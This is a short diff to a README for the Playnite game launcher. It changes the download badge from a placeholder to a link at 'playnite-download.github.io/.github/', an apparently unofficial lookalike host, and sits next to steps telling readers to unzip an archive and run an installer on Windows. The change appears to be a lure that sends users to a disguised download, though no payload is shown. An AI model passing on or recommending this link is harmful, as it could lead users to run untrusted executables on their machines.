@@ -8,7 +8,7 @@ It supports **metadata scraping, themes, extensions, and full controller navigat
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-purple?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-purple?style=for-the-badge)](https://playnite-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the **Playnite Installer** on your Windows PC.  
